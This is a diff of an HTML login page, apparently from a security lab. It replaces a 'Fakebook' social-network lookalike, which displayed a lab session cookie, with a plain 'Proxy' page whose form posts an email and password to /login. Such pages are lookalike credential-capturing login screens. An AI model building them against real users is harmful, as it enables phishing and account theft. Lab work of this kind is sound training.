@@ -3,42 +3,16 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Fakebook</title>
+    <title>Proxy</title>
     <link rel="stylesheet" href="/styles.css" />
   </head>
-  <body class="social-page">
-    <div class="social-shell">
-      <div class="brand-panel">
-        <div class="brand-logo">Fakebook</div>
-        <h1>Connect with people and share what matters.</h1>
-      </div>
-
-      <div class="auth-panel">
-        <form class="login-form" action="/login" method="POST" target="_blank">
-          <input id="email" name="email" type="email" placeholder="Email or phone" required />
-          <input id="password" name="password" type="password" placeholder="Password" required />
-          <button type="submit">Log In</button>
-
-          <div class="divider"><span>or</span></div>
-          <button type="button" class="secondary-button">Create new account</button>
-        </form>
-
-        <div class="cookie-demo-box">
-          <strong>Demo session cookie</strong>
-          <code id="session-cookie-value">Waiting for session...</code>
-        </div>
-      </div>
+  <body class="proxy-page">
+    <div class="proxy-shell">
+      <form class="proxy-form" action="/login" method="POST" target="_blank">
+        <input id="email" name="email" type="email" placeholder="Email or phone" required />
+        <input id="password" name="password" type="password" placeholder="Password" required />
+        <button type="submit">Log In</button>
+      </form>
     </div>
-
-    <script>
-      const cookieValue = document.cookie
-        .split('; ')
-        .find((row) => row.startsWith('secure_lab_session='));
-
-      const sessionCookieValue = document.getElementById('session-cookie-value');
-      if (sessionCookieValue) {
-        sessionCookieValue.textContent = cookieValue ? cookieValue.split('=')[1] : 'No session cookie yet';
-      }
-    </script>
   </body>
 </html>
